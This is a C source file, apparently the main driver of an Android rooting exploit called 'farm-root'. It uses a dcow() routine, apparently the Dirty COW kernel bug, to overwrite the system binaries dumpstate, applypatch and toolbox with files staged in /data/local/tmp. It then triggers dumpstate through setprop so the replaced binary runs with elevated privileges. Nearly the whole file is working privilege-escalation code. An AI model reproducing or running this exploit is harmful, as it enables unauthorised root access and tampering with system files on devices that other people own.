#include <android/log.h>
#include <unistd.h>
#include <sys/system_properties.h>
#include <stdio.h>

#include "shared.h"

// dcow.c
int dcow(const char *dst, const char *src);

int main(int argc, const char *argv[]) {
	printf( "(*) farm-root started (*)\n" );
	LOGV("[*] farm-root started");
	rsf_unset(RSF_ALL_DONE);

	printf( "[*] building a bridge\n" );
	LOGV("[*] building a bridge");
	if( dcow("/system/bin/dumpstate", "/data/local/tmp/bridge") ) {
		LOGV("ERROR: could not overwrite /system/bin/dumpstate");
		return 1;
	}

	printf( "[*] starting the bridge\n" );
	LOGV("[*] starting the bridge");
	if(!fork()) {
		const char *args[] = {"/system/bin/setprop", "ctl.start", "dumpstate", 0};
		if( execv(args[0], (char *const *)args) ) {
			LOGV("ERROR running setprop");
			return 0;
		}
	}

	printf( "[*] putting a till back in the shed\n" );
	LOGV("[*] putting a till back in the shed");
	if( dcow("/system/bin/applypatch", "/data/local/tmp/till") ) {
		LOGV("ERROR: could not overwrite /system/bin/applypatch");
		return 1;
	}

	printf( "[*] overwriting the toolbox\n" );
	LOGV("[*] overwriting the toolbox");
	if( dcow("/system/bin/toolbox", "/data/local/tmp/toolbox") ) {
		LOGV("too much of a mess");
		return 1;
	}

	printf( "[*] waiting for process to finish\n" );
	LOGV("[*] waiting for process to finish");
	while(!rsf_check(RSF_ALL_DONE)) sleep(1);

	printf( "[*] done!!!\n" );
	LOGV("[*] done!");

	return 0;
}
